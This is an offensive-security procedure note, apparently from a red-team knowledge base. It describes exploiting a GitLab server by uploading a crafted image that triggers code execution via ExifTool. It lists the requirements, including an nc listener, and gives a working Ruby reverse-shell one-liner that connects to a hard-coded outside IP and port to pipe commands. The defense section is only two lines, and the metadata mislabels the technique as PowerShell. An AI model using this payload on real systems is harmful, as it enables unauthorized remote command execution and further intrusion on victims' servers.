---
tags:
  - reverse-shell
  - rce
type: procedure
tools:
  - '[[tools/ExifTool]]'
  - '[[tools/Ruby]]'
  - '[[tools/Perl]]'
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Linux
techniques:
  - '[[Command-Line Interface]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques:
  - '[[PowerShell]]'
id: cf9f9f36-b454-412d-ba7d-fde6f062daf6
created_at: '2025-12-11T03:47:58.334Z'
updated_at: '2025-12-11T03:47:58.334Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059]]'
---
# Establish Reverse Shell via Injected Code

## Summary

This procedure uploads a PoC image that injects Ruby code to spawn a reverse shell, connecting back to an attacker-controlled IP and port.

## Description

The injected Perl eval runs a Ruby script that forks and establishes a TCP connection, allowing remote command execution on the GitLab server.

## Requirements

1. Crafted reverse_shell.jpg file
2. Listener on attacker machine (e.g., nc -lvnp 12345)
3. GitLab upload access

## Defense

Defensive measures and detection strategies:

- Firewall outbound connections
- Monitor for unexpected Ruby processes

## Objectives

1. Gain interactive shell access
2. Execute as git user
3. Enable further exploitation

## Instructions

### Step 1: Upload Reverse Shell PoC

**Context**: Attach reverse_shell.jpg to a new GitLab snippet.

### Step 2: Receive and Interact with Shell

**Context**: The payload executes [[commands/ruby-reverse-shell]]:

```bash
ruby -rsocket -e exit if fork;c=TCPSocket.new("103.3.61.137",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
```

> Connects to 103.3.61.137:12345 and pipes commands.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques

- [[PowerShell]]

## Commands Used

- [[commands/ruby-reverse-shell]]

## Tools Used

- [[tools/Ruby]]

## Tags

- [[commands/ruby-reverse-shell]]
- #rce
